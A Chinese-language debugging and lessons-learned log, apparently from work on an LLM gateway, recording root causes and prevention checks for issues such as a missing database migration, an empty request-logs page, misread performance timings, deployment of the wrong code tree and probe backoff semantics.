- 任务 / 缺陷：退役轮追查 5/7 目标模型不可用。根因链有四层：`/v1/models` 少了它们 → 绑定它们的 cred=1/cred=3 是 `quota_state=permanently_exhausted` → 路由候选 SQL（`provider/client.go` 的 `quota_state NOT IN ('permanently_exhausted',…)`）把它们全部排除 → 而这个状态之所以**永远翻不回来**，是因为探针写回一直在失败。
- 基线 / 修复 SHA：修复 `apply-db-revision-sequence.sh` 补登 044（见下条提交）。
- 根因：`sql/migrations/startup/044_health_source_probe_now.sql` 早就在仓库里，文件头注释把症状原样写了出来（`ERROR: … violates check constraint "chk_credentials_health_source" (SQLSTATE 23514)`），但它**从未进入任何部署入口**——不在 `apply-db-revision-sequence.sh` 的 files=()，也不在 `installer/internal/dbinit/runner.go` 的 StartupFiles（后者只收 478+，0xx 段被 baseline 吸收，而 **baseline 里的约束同样是旧形态**，所以全新安装也复现）。于是 `chk_credentials_health_source` 永远停在缺 `probe_now` 的旧白名单，而 `bg/credential_probe_v2.go:2180/2198` 的 ProbeNow 快路径固定写 `probe_now` ⇒ **每一次探测都写不进去**。
- 定位手法（可复用）：不要从「模型为什么不可用」这种结果往回猜，直接在日志里 grep **写回失败的日志关键字**——`hard-quota bookkeeping update failed` 一命中就把 SQLSTATE 23514 和约束名摆出来了，四层根因链在一次 grep 里塌缩成一条。四层归因（列表缺 → 凭据态 → 候选 SQL → 写回失败）如果逐层猜，会在中途误判成「额度真的用完了」。
- 防复发检查：迁移文件存在 ≠ 会被执行。判断一个迁移是否真正在通道里，要查**两个入口 + baseline**：`scripts/apply-db-revision-sequence.sh` 的 files=()、`installer/internal/dbinit/runner.go` 的 StartupFiles、以及 baseline 是否已吸收其效果。`sql/migrations/startup/` 有 495 个编号而 installer 只登记 264 个 ⇒ 孤儿是常态不是意外。
- 证据：修复前 cred=3 在 22 分钟内 23514 失败 22 次（累计 40 次，最后一次 21:33:20）；补登并经通道执行后（`gateway_db_revision_sequences` 记 content_sha256 == execution_sha256、`runtime_adaptation=request-logs-physical-v1`），cred=1 与 cred=3 的 `health_source` 都成功写成 `probe_now`，**23514 计数不再增长**，且 cred=1 的 `quota_state` 从 `permanently_exhausted` 自行翻回 `ok`。迁移序列契约门 9/9 RC0。
- **但不要过度宣称**：模型可用性并未因此恢复——cred=3 仍是 `availability_state=rate_limited`（真实上游限流），`/v1/models` 从 95 变成 93。数据库写回恢复只是**必要条件**，真实限流/额度仍需上游侧解决。cred=1 的 `quota_state` 翻回 `ok` 但其模型未回到列表，说明还有 `model_probe_state` / 探测态等第二层闸门未过。
- 状态：观察中（044 已进通道；生产 154/245 是否同样受影响**未核实**，需在生产侧确认约束白名单）

## 2026-10-16 — 「页面空白 vs 后端无数据」用网关访问日志定案，别用 CDP 快照（Seen: 1/3）

- 任务 / 缺陷：`/request-logs` 渲染完整、已登录为超级管理员，但恒显「共 0 条 / 无记录」；而 `GET /api/logs` 直接 curl 返回 `count=576` + 37KB。
- 基线 / 修复 SHA：观察于 `c3abfbca1`（不在退役改动集内，`git diff HEAD~2 HEAD` 对 `web/` 零命中）。
- 方法一（错的那条）：浏览器 `network` 快照里只看到 `/api/keys`、`/api/routing/available-models`、`/api/keys` 三条 **pending**，据此判「页面根本没发 `/api/logs`」。**这个推论不成立**——服务端实测这三条分别只要 3ms/35ms/51ms，快到完全可能在快照瞬间处于 pending。差点把"快照里没看到"当成"没发生"。
- 方法二（对的那条，且不依赖浏览器工具）：**查网关自己的 `http_request` 访问日志**。它是服务端事实，不受 CDP 采样/超时影响。
- 网关日志给出的事实链：浏览器时代的请求序列是 `/api/keys` → `/api/providers` → `/api/routing/available-models` → `/api/system/bootstrap/status`，**唯独没有 `/api/logs`**；`/api/providers/{id}/credentials` 在 21:13 之后再未出现；而 `/api/providers` 自身**出现过 500**（21:18:44 / 21:23:33，夹在 200 之间）。
- 代码侧定位到可疑结构：`onMounted` 是**串行 await 链** —— `await loadKeys()` → `await loadCredentialOptions()` → `await load()`。第三段里的 `loadCredentialOptions()` 又对**每个** provider 并发 `await getProviderCredentials(p.id)`（`Promise.all`，provider 表有几十行）。这条链上**任何一环不 resolve，`load()` 就永不执行**，而模板已经渲染完，于是正好表现为「页面完整但 0 条」——服务端无责。
- 已排除：后端 `/api/keys` 3ms、`/api/routing/available-models` 35ms、`/api/logs?page=1&page_size=20` 51ms（结构为 `{items,count,aggregate}`，与前端 `resp.items`/`resp.count` **完全匹配**）；时间范围过滤无关（带 from/to 的四种时区组合均返回 576）；`timeRange()` 是纯同步无循环；`loadCredentialOptions()` 的 catch 分支会正常 `return`。
- 防复发检查：(a) 页面空白**先查服务端访问日志**判断"请求发没发"，再谈渲染；(b) CDP/network 是**采样**不是事实，pending 不等于没发生，慢请求必然出现 pending；(c) 前端 `onMounted` 里的串行 `await` 链要当"单点故障链"审：任一环挂起 = 整个页面的数据区永久空白，而 UI 毫无报错。
- 状态：观察中（确切卡点仍需能读浏览器 Console 的环境；已把范围从"整个前端"收窄到 `loadKeys/loadCredentialOptions` 这条链，且指向 `/api/providers` 的 500 与不稳定的 per-provider credentials 扇出）

## 2026-10-16 — 无节制并发扇出会饿死主数据请求，且症状是「无报错的空白页」（Seen: 1/3）

- 任务 / 缺陷：`/request-logs` 恒显「共 0 条 / 无记录」，而 `GET /api/logs` 直接 curl 返回 `count=576`。页面完整渲染、已登录为超级管理员、**控制台无任何报错**。
- 基线 / 修复 SHA：修复在 `RequestLogsView.vue` 的 `onMounted`（`await loadCredentialOptions()` → `void loadCredentialOptions()`）。
- 根因：`onMounted` 是串行 await 链 —— `loadKeys()` → `loadCredentialOptions()` → `load()`。第三段里 `loadCredentialOptions()` 对**每个** provider 并发 `await getProviderCredentials(p.id)`（`Promise.all`）。本地 `providers` 表 47 行 ⇒ 首屏一次性扇出 **47 个同源请求**；浏览器对同源 HTTP/1.1 只有约 **6 条**并发连接，主数据请求 `/api/logs` 被挤到队尾并最终被客户端取消。
- 服务端留下的铁证：`admin listLogs count query failed: context canceled`（`caller: logs.go:646`）。**注意这条在 `http_request` 访问日志里查不到** —— 请求被取消后没走到记录访问日志那一步，只在 handler 的错误分支留痕。只看访问日志会得出「前端根本没请求」的错误结论（我第一轮就是这么错的）。
- 讽刺之处：这段实现**违反了自己上方 40 行的设计约定**——注释原文写着「任一来源失败都不阻塞日志列表渲染，下拉回退为空」，但代码用 `await` 把下拉加载变成了日志列表的硬前置。修复即回归该约定：`void loadCredentialOptions()`，主列表先发，下拉后台补齐，失败仍由内部兜底并在筛选区显示，语义不变。
- 为什么这类症状极难定位：① `/api/logs` 在访问日志里**缺席**，容易被误判成"前端没发"；② 手动 curl 一切正常，服务端零责任；③ 前端无报错，UI 完全正常只是没数据；④ 触发条件是**数据量**（47 个 provider），provider 少的环境永远复现不了。
- 防复发检查：(a) 排查"页面空白"时，**服务端 handler 错误日志要先于访问日志**看——`context canceled` / `deadline exceeded` 只在前者；(b) 前端对列表做 `Promise.all` 扇出前先看**基数**，并考虑分批或加并发上限；(c) `onMounted` 里的串行 await 链要当单点故障链审，任一环挂起 = 整页数据区永久空白；(d) 注释写下的设计约定要与实现对账，注释说"不阻塞"而代码 `await` 了，就是 bug。
- 证据：修复前网关日志 21:44:04 可见 `/api/providers` 200 后仅 6 个 credentials 请求（其中 5 个 500），`/api/logs` 只在 handler 错误分支留 `context canceled`；`/api/providers` 实返 47 条。手动复现 6 个 credentials 端点全部 200（说明 500 也是并发挤压的伴生现象，非独立缺陷）。修复后 `vue-tsc -b` RC0。
- 状态：观察中

## 2026-10-16 — 「并发超限」要用 duration 算 in-flight，用请求条数会高估（Seen: 1/3）

- 任务 / 缺陷：`/request-logs` 首屏恒 0 条。排查中我一度用「任意 100ms 窗口内的请求条数」当作并发数，得出「峰值并发 13、超浏览器上限 6 一倍多」，并据此又加了两轮修复。**这个口径是错的**。
- 基线 / 修复 SHA：三轮修复 `c4212904b`（扇出分批）、`d6c79ba22`（全局闸门）、`8ab468fc6`（原生 fetch 纳入）。
- 口径纠正：服务端 `http_request` 日志带 `duration_ms`，用它把每个请求展开成 `[开始, 结束]` 区间再数重叠，才是**真实 in-flight 并发**。改口径后实测峰值 **4**（正好等于闸门上限），**从未超过浏览器的 6**。用请求条数会把「10ms 内各完成一个的 10 个请求」误读成「10 路并发」。
- 决定性对照：16 线程并发 curl 复刻整个首屏（含 `/api/logs` + 全部 per-provider credentials）共 32 个请求，**32/32 全 200**；同一时刻浏览器侧仍被取消。据此判定最后一层原因是**浏览器环境**——非活动标签页被 Chromium 冻结，飞行中的 fetch 被 abort，服务端如实记 `context canceled` 而前端拿不到可处理的错误。旁证：被取消的 `/api/providers/16/credentials` 耗时 **0.0ms**（连接被直接重置，不是排队超时）。
- 仍然成立的修复（三轮都已上线且可验证）：47 路 provider 扇出 → 分批 4；首屏 20 个请求 → 15；`bootstrap/status` 由 useAppNav 与 router 各调一次合并为 1 次；真实 in-flight 并发受控。**这些是实打实的首屏改进，只是它们不是 0 条的最终原因。**
- 防复发检查：(a) 并发判断必须用 duration 区间重叠数，**不要用时间窗内的请求条数**；(b) 判断「是不是服务端的锅」要有一组**同条件并发对照**（并发 curl 复刻同一批端点），32/32 成功就别再往服务端找；(c) 三轮修复后症状仍在，要敢于把最后一层归到环境上并**明说**，而不是继续加码改动面。
- 证据：`vue-tsc -b` RC0（三轮）；前端全量 **237 文件 / 2484 用例全 PASS**（37~40s，三轮）；duration 重算峰值 in-flight = 4；并发 curl 32/32。
- 状态：观察中（应用侧已修完；页面最终复验需在**可交互**的浏览器环境进行，本会话的 Electron 浏览器标签多次冻结不可靠）

## 2026-10-16 — 性能数字先证伪再采信：行过滤会把报错耗时当成提速（Seen: 2/3）

- 任务 / 缺陷：给 `GET /api/admin/data-lifecycle/storage/tables`（本机实测 1286 / 2500 / 1734ms，唯一还 >2s 的 admin GET）找优化手段。测出把 TOAST 的相关子查询 `SELECT t.oid FROM pg_class t WHERE t.reltoastrelid = c.oid` 改写成 `LEFT JOIN pg_class tc ON tc.oid = c.reltoastrelid` 后只要 **6–9ms**（原写法 1170 / 1197 / 3463ms），提速两个数量级，差点直接采用。
- 根因：测量命令是 `psql -f q.sql 2>&1 | grep -i '^Time'`。**`\timing` 对失败的语句同样打印耗时**。而 PG 17 的 `pg_stat_user_tables` 里**根本没有** `total_size / indexes_size / toast_size` 列（`information_schema.columns` 查 `%size%` 返回 0 行），查询直接 `ERROR: column s.total_size does not exist` —— 那 8ms 是**报错耗时**。是同批跑的对照查询（没做行过滤）把同一个错误暴露了出来。
- 补充口径纠正：真正的慢因不是 TOAST 子查询，而是 `ORDER BY pg_total_relation_size(c.oid) DESC` —— 排序必须对**全部 440 张表**逐个算大小，`LIMIT 20` 省不掉这笔钱。改成 OID 索引查找实测**没有收益**（1170/1197/3463 vs 1696/1254/1455ms），所以最终走短 TTL 快照。
- 防复发检查：(a) 性能对比命令**不允许只用 `grep Time` 这类行过滤**，至少保留 `ERROR` 或校验返回行数；(b) 报"提速"前先跑对照查询确认两版都真的返回了数据行，而不是只看耗时；(c) "新写法快很多"必须能指出旧写法慢在哪一段的 EXPLAIN 证据，否则先怀疑自己测错了东西。
- 证据：上文三次实测序列；`\timing` 对 ERROR 语句仍输出 `Time:`（复现命令见本条"根因"）；最终实现 `admin/data_lifecycle_storage.go` 的 `tableSizesSnapshot`，冷 3.47s → 热 14.3µs。
- 补记（当日第 2 次，同源）：查 `pg_class` 确认 `session_bodies_hot` 是否存在时，`ORDER BY relname` 的输出被 `head -25` 截断，该行恰好排在所有 `session_bodies_2026_10_*` 之后，于是又得出一次「表不存在」的错判。**行截断与行过滤是同一类错误**：都只保留让人看到的那部分，却按「全部」来推理。见下条。
- 状态：已落地

## 2026-10-16 — 缓存切片类改动的真正风险是口径漂移，不是缓存（Seen: 1/3）

- 任务 / 缺陷：`/storage/tables` 从"每次按 `limit` 查库"改成"一次采满 `tableSizesMaxLimit=200` 行、再按请求的 `limit` 切片"。
- 根因：新引入的 `sliceTableSizes` 必须按**本次 limit** 重算 `totalBytes` 与 `PercentOfDB`。若沿用采满时的值，**不会报任何错** —— 百分比照样落在 0–100，页面照常渲染，只是 `limit=20` 显示的变成"对 200 行求和的占比"，与优化前口径不同。这类缺陷没有任何运行时信号，只能靠判据挡住。
- 连带发现：**Top-N 是 Top-M 的前缀，这个推理要求排序确定性**。原 SQL 只有 `ORDER BY 4 DESC`，字节数并列时 PG 的排序不稳定，前缀性质只能算"大概率成立"。补 `, 1`（`relname`）作次键后严格成立，对耗时无影响。
- 防复发检查：(a) 占比 / 均值这类**相对量**，判据要用**响应自身的分母**复算，不要用绝对常量 —— 绝对常量会让"分母错了但分子恰好也错"的实现蒙混过关；(b) 引入缓存或切片时，逐字段列出"哪些值依赖 limit / 参数"，对**每一个**写断言，并先断言区分力前提（如 Top-5 之和确实小于 Top-200 之和）；(c) 任何"前缀 / 子集"推理，先确认底层排序有确定性 tie-break。
- 判据：`admin/data_lifecycle_storage_tables_perf_test.go` 的 `TestDataLifecycleTableSizesSliceRecomputesTotals`（变异验证：切片忽略 limit → 红；占比不重算 → 红）。
- 状态：已落地

## 2026-10-16 — 判据覆盖了被测常量，会让该常量的变异不可见（Seen: 2/3）

- 任务 / 缺陷：给 `storageOverviewTTL` / `tableSizesTTL` 写"TTL 到期会重新取数"的判据。第一版写法是把 TTL 临时压到 60ms 再等过期。
- 根因：这版判据**把被测常量本身覆盖掉了**，于是"把 TTL 改成 365 天"这个变异在判据视野里不可见 —— 过期用例照样全绿（因为它自己把 TTL 设成了 60ms），只有显式失效路径会变，而显式失效不看 TTL。结果是数据可以永久陈旧而判据无感。
- 修法：加一条**独立的默认值上界断言**（`tableSizesTTL ∈ (0, 60s]`），放在临时覆盖**之前**执行，让生产默认值本身进入判据范围。TTL 改成 365 天时红在 `:343`。
- 防复发检查：(a) 任何判据如果临时修改了被测常量，必须另有一条**不改常量**的断言覆盖它的默认值；(b) "过期刷新"类判据若只覆盖常量，就只能证明"覆盖后的值会过期"，不能证明"生产值会过期"。
- 证据：`TestDataLifecycleTableSizesTTLExpiryRefetches:343`；总览侧同名判据 `TestDataLifecycleStorageTTLExpiryRefetches:399` 同构补齐。**同一模式当日出现两次（总览轮 + Top-N 轮），第三次出现即晋级为规则。**
- 状态：观察中

## 2026-10-16 — 「停写/数据丢失」先怀疑自己数错了表：写入目标是 hot 表不是分区父表（Seen: 1/3）

- 任务 / 缺陷：退役验收查「新流量的 session 正文有没有落库」。`SELECT count(*) FROM session_bodies` = 550，`max(ts)` = **2026-10-16 16:22**，近 90 分钟 **0 行**；而同期 `session_turns_hot` 落了 47 行、其中 27 个成功轮。差点判成「正文写入在 16:22 停了 9 小时 = 一类数据丢失」。
- 根因：**写入目标根本不是 `session_bodies`**。`domains/session/v2/bodies_writer.go:310,368` 写的是 `public.session_bodies_hot`（8 小时窗口表），由 PartitionManager 事后提升成 `session_bodies_yyyy_mm` 月度分区。而 `session_bodies_hot` 是**独立表**（`pg_inherits` 里对它的继承行数 = 0），所以 `count(*) FROM session_bodies`（分区父表）**不包含** hot 表的任何行。实测 hot 表 76 行、近 90 分钟 48 行、`max(ts)` 就是当时——正文一直在正常写。
- 连带一个同源的假回归：查 `pg_class` 想确认 hot 表在不在，结果 `ORDER BY relname` + `head -25` 把 `session_bodies_hot` 截掉了（ASCII 序里 `session_bodies_2026_10_*` 全排在 `session_bodies_hot` 之前），于是又得出一次「hot 表不存在」的错判。**同一天第二次被行截断/过滤吃掉证据。**
- 防复发检查：(a) 判断「某类数据是否还在写」时，**先从写入代码里 grep 出它 INSERT 的那张表**，再去数那张表，不要按表名"看起来像父表"去猜；(b) 分区体系里要分清**分区父表 / hot 窗口表 / 已提升的月度分区**三者的包含关系，`count(*)` 只在父子关系成立时才等价；(c) 提升是延迟的（此处 8 小时），所以"父表最新时间戳停在几小时前"本身完全正常，不构成停写证据；(d) 任何 `head -N` / `grep` 截断的输出，若要据此下"某对象不存在"的结论，必须先确认被截断的区间不包含它。
- 证据：`session_bodies`=550（max ts 16:22）/ `session_bodies_hot`=76（max ts 与当时一致）；27 个成功轮的正文覆盖率用 hot 表算是 **27/27**，用父表算是 0/27。
- 状态：已落地（结论改写：正文持久化无缺陷）

## 2026-10-16 — 会话 id 只认 `gw_`/`gt_`/`gs_` 前缀，自造 id 会被静默丢弃（Seen: 1/3）

- 任务 / 缺陷：做「5 轮真实多轮会话」验证时，客户端发 `X-Session-Id: retire-verify-<hex>`，结果库里每个会话都只有 **1 turn**，会话 id 全是网关新生成的 `gw_*`。
- 根因：`domains/streaming/handler.go:581 sanitizeGwSessionHeader` 只接受 `gw_`（主会话）/ `gt_`（自动标题分支）/ `gs_`（自动摘要分支）三种前缀，其余一律当"客户端元数据"丢弃（`cmd/gateway/main_pipeline.go:772` 的 `X-Gw-Session-Id` → `X-Session-Id` 回退只解决大小写与命名优先级，不解决前缀校验）。所以**多轮验证在结构上根本没发生**，5 次请求被拆成 5 个独立单轮会话。
- 判别方法：`prompt_tokens` 是否随轮次增长。改正前缀后 glm-5.2 的 ptok 为 33 → 62 → 97，说明上文确实带上了；改正前每轮 ptok 恒定。
- 防复发检查：(a) 自造客户端标识前先读校验函数，别假设"任意字符串都会被采纳"；(b) 「多轮」验证必须有一个**独立于响应**的证据（库里同一 session 下 turn_no 连续递增、或 ptok 单调增长），否则 5 次独立请求会被误当成 5 轮会话；(c) 断言里不要用客户端自己传的字段做过滤条件——网关可能根本没用它。
- 状态：已落地

## 2026-10-17 — 「模型不可用」先看错误码分层：no_candidate vs All candidates failed（Seen: 1/3）

- 任务 / 缺陷：验收「7 个模型」时，6 个不可用。我一度归因为
  「4 个在 `provider_models` 没登记 + 建议给它们绑一条到健康凭据上」。
  **两个结论都是错的**，而且方向相反——真实阻塞是上游容量。
- 决定性证据（错误码分层）：请求 `minimax-m2.7` 时拿到的是
  `model_not_found: **All 3 candidates failed**`，而 `minimax-m3` /
  `glm-5.3-flash` 拿到 `no_candidate`。
  - `no_candidate` = 候选**构造不出来** ⇒ 目录里查不到这个模型（登记/映射问题）
  - `All N candidates failed` = 候选**找到了、逐个尝试过、都失败** ⇒ 解析链路正常，
    是上游在拒绝
  同一个模型在两次调用里给出不同错误码，恰恰说明**它可解析、只是上游在抖**。
- 命名错配这个假设是被**代码**否掉的，不是被数据：`provider_models` 用两列表达同一模型
  （`raw_model_name` 带 provider 前缀、`standardized_name` 不带），而候选解析
  `provider/client.go:1151,1225,1693` 是 `OR mo.standardized_name = $1`，
  **两列都匹配**。所以 `minimaxai/minimax-m3` 这种带前缀登记**不影响**对外可达。
- 「绑到健康凭据上」这条路本身就不成立：`credentials.provider_id` 决定归属
  （cred=1→2453、cred=2→2452、cred=3→2454），把 2454 的模型绑到只服务 2453 的
  凭据是跨厂商端点的语义错误。
- 连带观测：`/v1/models` 公布数随熔断状态在 **10 ↔ 92/94** 之间摆动
  （cred=2 熔断 60s 期间只公布 10 个）。**公布 ≠ 当前可服务**。
- 防复发检查：(a) 排查"某模型不可用"要**先分层**：错误码说 `no_candidate` 才去查登记，
  说 `All N candidates failed` 就去查凭据健康/上游；(b) 动手改数据绑定前先确认
  `credentials.provider_id` 的归属语义，别以为凭据可以跨 provider 复用；
  (c) 归因"未登记"前先查 `standardized_name`，只看 `raw_model_name` 会漏掉整类模型；
  (d) 同类样本要取**多个**再下结论——单次抽样会把瞬时熔断误读成静态缺失。
- 证据：熔断恢复前后 `/v1/models` = 92；`minimax-m2.7` → `All 3 candidates failed`
  vs `minimax-m3`/`glm-5.3-flash` → `no_candidate`；cred=2 `circuit_state` 于
  01:23:42 open → 01:24:42 closed（60s 自愈）。
- 状态：已落地（写入 `docs/05-testing/02-test-plans/会话轮次退役/退役验证记录.md` §8.1）

## 2026-10-17 — 计数型判据要断言「结果可见」，不能只等计数增长（Seen: 1/3）

- 任务 / 缺陷：把 `/storage/tables` 改成 stale-while-revalidate 后，要改判据
  `TestDataLifecycleTableSizesTTLExpiryRefetches`（原契约是"TTL 到期同步重查"，
  新契约是"返回旧读数 + 后台刷新"）。我第一版新判据是：等
  `tableSizesCollectCount() >= 2` 就算刷新发生，再取一次断言新值。
- 根因：`collect` 计数在 **查询开始前**就 `Add(1)`。所以轮询到 2 时，
  后台采集**可能还在跑、快照尚未写回**，于是随后的取值仍拿到旧读数——
  用例红在 `刷新后 TotalBytes = 52649984, want > 52649984`。
  **计数增长 ≠ 工作完成。**
- 修法：契约是"刷新最终让新读数可见"，就**按结果轮询**（带 deadline），
  而不是按计数器轮询。这同时把"刷新没发生"和"刷新太慢"两种失败都收进同一条断言。
- 防复发检查：(a) 任何以 `atomic` 计数器/布尔标志作为判据条件的用例，
  必须确认该计数是在**工作完成后**才自增；若是在开始前自增，就不能拿它当"完成"信号；
  (b) 后台/异步化的改动，判据要断言**用户可见的结果**（新值出现），而不是内部信号；
  (c) 异步化后原同步判据必然失效，要连同"非阻塞"这条一起补上（本次补了
  <300ms + 返回旧读数两段）。
- 证据：`data_lifecycle_storage_tables_perf_test.go:391`（M5）与 `:417`（M6）两处变红；
  修好后日志 `过期响应=52723712(202µs) 刷新后=60325888`。
- 状态：已落地

## 2026-10-17 — deploy-local 切流失败的根因是端口，不是新代码：pidfile 可与真实持有者脱节（Seen: 1/3）

- 任务 / 缺陷：用 `scripts/deploy-local.sh deploy` 部署含预热改动的新版本，
  连续 3 次 `readiness gate failed`，最终 `active cutover failed; previous
  release was restarted`。表面看像是"新代码起不来"。
- 真因（**与新代码无关**）：日志里是
  `ERROR gateway listen failed: listen tcp :8782: bind: address already in use`。
  启动流程一路走到 `CHECKPOINT: HTTP server configured`，**没有任何 panic**——
  新二进制本身是好的，只是抢不到端口。
  现场取证：真正持有 8782 的是 PID 87330（01:59 启动的 2687，`PPID=1` 孤儿），
  而 `run/gateway-8782.pid` 里写的是 **21247**（早已死亡的另一个 pid），
  脚本 `stop_instance` 按 pidfile 去停 19769，**压根没碰到 87330**。
- 附带发现：`/tmp/lgw-env.sh:14` 有 `export LLM_GATEWAY_ROOT=...`。
  在**它之后**再 `export LLM_GATEWAY_ROOT="$(pwd)"` 会被静默覆盖；
  而 `LLM_GATEWAY_ROOT` 只是部署根（`~/kaixuan/llm-gateway-go-v2`，非 git 仓库），
  源码根是脚本自身的 `PROJECT_ROOT`（`SCRIPT_DIR/..`）。
- 防复发检查：
  (a) 切流失败先看 `gateway-*.log` 里的 `gateway listen failed` —— 有这行就是
      **端口/孤儿问题**，不是代码问题，别去改代码；
  (b) 部署前先 `lsof -nP -iTCP:8781 -iTCP:8782 -sTCP:LISTEN` 与
      `run/*.pid` 对账，二者不一致就说明有孤儿，先按 TERM→轮询→KILL 规范清掉；
  (c) 每次部署都必须 `export LLM_GATEWAY_ROOT`，且**在 `source /tmp/lgw-env.sh`
      之后**执行，否则等于没设；
  (d) `reap_stray_gateways` 是**模式锚定部署根**的，本仓进程实际跑在 worktree 的
      `bin/2.5.8.NNNN/gateway` 下，锚点不同就可能清不到——不能指望它兜底。
- 证据：`~/kaixuan/llm-gateway-go-v2/logs/gateway-8782.log` 尾部
  `listen tcp :8782: bind: address already in use`；`lsof` 87330 vs pidfile 21247；
  停掉 87330 后重部成功。
- 状态：已落地（本地开发网关；同一模式在 154/245 用 deploy-seamless，不适用本条）

## 2026-10-17 — 部署纪律：切流失败先看端口；更隐蔽的是「部署了错误的代码树」（Seen: 1/3）

- 任务 / 缺陷：用 `scripts/deploy-local.sh deploy` 部署含预热改动的新版本。
  **连续 4 次部署（2688–2691）全部 `VERIFY_PASS=1`，但一次都没部署到我的代码。**
- 真因（**我自己犯的**，AGENTS.md 早就写过「source 后必须立刻 cd 回 worktree」）：
  `/tmp/lgw-env.sh` 第 15 行是 `cd /Users/.../llm-gateway-go || exit 1`。
  我写的是 `cd <worktree> && source /tmp/lgw-env.sh && deploy`，于是 source 把我
  **切回主 checkout**，deploy 脚本随之解析到主 checkout 的副本，
  `PROJECT_ROOT` 变成主 checkout，编出来的是并发会话那棵树（git_sha 9406de65）。
- 静默性来源：`deploy-local.sh` 自带 verify，`VERIFY_PASS=1` 只证明
  「新产物起来了且 /version 与 bundle 元数据自洽」，**不证明产物来自我想要的源码**。
  `version.json` 里的 git_sha 取自**仓库里那个陈旧的 version.json 文件**，
  本次它就写着 9406de65——所以连版本号都在**配合**这个错误，一眼看不出来。
- 抓到的证据（都是"多看一眼"才抓到的）：
  (a) `strings <bundle>/gateway | grep "startup prewarm of overview failed"` = 0，
      而同参数自建的有 1；
  (b) 2688/2690/2691 三个 bundle 的 `gateway` **md5 完全相同**（`f4e954ef…`）——
      输入不变则产物不变，而我的源码明明变了；
  (c) `go env GOMOD` 指向主 checkout 的 `go.mod`（正常应是 worktree 的）。
- 防复发检查：
  (a) **source 之后必须立刻 `cd` 回目标 worktree**，顺序写成
      `source /tmp/lgw-env.sh && cd <worktree> && export LLM_GATEWAY_ROOT=... && deploy`；
  (b) 部署后**验产物内容**，不只看 `VERIFY_PASS`：至少挑一个本次新增的字符串常量
      `strings` 一下，或比对 bundle 二进制 md5 是否随源码变化；
  (c) `VERIFY_PORT`/`VERIFY_RELEASE` 要一起看，只 grep PASS 会漏掉端口错位；
  (d) 切流失败先看 `gateway-*.log` 的 `gateway listen failed`——有这行就是**端口/
      孤儿**问题，不是代码问题（本次另有一次：`run/gateway-8782.pid` 写 21247、
      真实持有者是 PID 87330 的孤儿进程，脚本按 pidfile 去停另一个 pid，
      新进程 `bind: address already in use` 连续 3 次 readiness gate 失败）。
- 证据：自建 md5 `3bbae51c…`（含 DBG 埋点）vs 部署 md5 `f4e954ef…`（无）；
  修正顺序后 2692 的 git_sha = `1233e793`（= 本 worktree HEAD）且
  `strings` 命中预热常量。
- 状态：已落地（本地开发网关；154/245 用 deploy-seamless，不适用本条）

## 2026-10-17 — 会自愈的状态不能写成静态结论；先找那个"已经归好名"的视图（Seen: 1/3）

- 任务 / 缺陷：验证 7 个目标模型在本地网关上是否可用。
  01:4x 那轮我写下的结论是「三条凭据全部额度耗尽，本地已无任何上游容量」。
- 根因（结论本身错，不是数据错）：凭据状态**会自愈**。02:4x 在同一台机器重测，
  cred=1 已完全恢复（视图判定 10/10 `is_routable`），
  `deepseek-v4-flash` 与 `glm-5.2` 端到端 200。把某一时刻的读数写成结论，
  等于把快照当常量。
- 真正的分层（此前被"全是额度问题"这句话盖住了）：三个凭据三种**互不相同**的原因——
  cred=1 已恢复；cred=2 `availability_state=ready` 却因 `node_probe_state` 里
  8 行 `last_direct_ok=false AND next_retry_at > now()` 而贡献 **0 个候选**；
  cred=3 标着 `permanently_exhausted` 却带着每次都往前滚的 `availability_recover_at`。
- 防复发检查：
  (a) 报告"某能力不可用"前，**必须当场重测一次**，且把结论写成
      「时刻 T 的观测 + 会自愈」而不是「不可用」；
  (b) **先找那个已经把失败原因归好名的视图**再手写 SQL。本轮
      `v_routable_credential_models.unavailable_reason` 直接给出
      `node_probe_failed` / `availability_rate_limited`，
      一步就把三层原因分开了——手写候选 SQL 只能看到"0 行"，看不出是哪一条；
  (c) 区分"整体不通"与"某个凭据独占的模型不通"要靠**判别实验**：
      另取 3 个同属该凭据独占的模型实跑，全 503 ⇒ 是凭据级问题；
      本轮正是这一步否掉了"只有这几个模型坏了"的猜测；
  (d) `health_status=healthy` **不代表能路由**（cred=2 就是反例）。
- 附带查出的独立缺陷：`quota_state='permanently_exhausted'` 与
  `availability_recover_at` 每次前推 ~90s 自相矛盾，而候选 SQL 用
  `quota_state NOT IN ('permanently_exhausted',…)` 做**硬排除** ⇒
  **143 个本可每 90s 服务一次的模型被当成永久不可用**。命名与语义不符，
  待 owner 决定改状态还是改语义（见验证记录 §8.1）。
- 证据：`v_routable_credential_models` 按凭据统计
  `cred=1 routable=10/10`、`cred=2 routable=0/89 (node_probe_failed)`、
  `cred=3 routable=0/148 (availability_rate_limited)`；
  三次 25s 间隔采样下 cred=3 的 `availability_recover_at`
  02:49:13 → 02:50:43 → 02:50:43。
- 状态：取证已落地（`docs/05-testing/02-test-plans/会话轮次退役/退役验证记录.md` §8.1），
  状态语义修正待 owner 拍板

## 2026-10-17 — 同一个错误码在两条代码路径里可以差 360 倍；先问"错误类别参与了决策吗"（Seen: 1/3）

- 任务 / 缺陷：排查目标模型 `glm-5.3-flash` 为什么不可路由。
  路由层给的答案是 `node_probe_failed`，指向 `node_probe_state` 的探针退避。
- 第一次归因错了：我写成「节点探针退避不自解，8 个模型持续压制」。
  **错。** 退避阶梯是 `bg/node_probe.go` 硬编码的 `NodeProbeBackoffChain`
  （`5s→30s→60s→5m→1h→2h→6h` 封顶），注释里明写
  "rows keep ticking forever — 'paused' was removed from this mode"。
  它不是卡住，是**每 6 小时仍会重试**。我看到 `next_retry_at` 在未来 4 小时就
  下结论"不自解"，等于把"下一次重试还没到"读成了"不会再来"。
  **采样窗口（50 秒）短于重试周期（6 小时）时，任何"没有恢复"的观察都是无效的。**
- 真正的机制：`bg/node_probe.go:2620` 用
  `ChainBackoffIndex(attempt, NodeProbeBackoffChain)` 取延迟，
  **只用 attempt 索引，`last_err_code` 完全不参与决策**。逐行实况：
  8 行里 4 行是上游 **410「已到生命周期终点」**、1 行 429、1 行 timeout、
  1 行 404、1 行 500。于是：
  - **410（永久）按瞬时处理**，每 6 小时重试、永远重试；
  - **429（瞬时）被升到 6 小时封顶**。
- 而同一仓库的凭据级探针 `classifyProbeFailure`（`bg/credential_probe_v2.go`）
  早就把两者都判对了：410 = **binding 级终态**（兄弟模型照常可路由，
  判据 `TestClassifyProbeFailure_ModelEOLEndOfLifeIsBindingOnly`）；
  429 = **60 秒**恢复窗口。
  **同一个 410 与同一个 429，两条探针路径给出完全不同的结论；
  429 的恢复窗口相差 360 倍（60s vs 21600s）。**
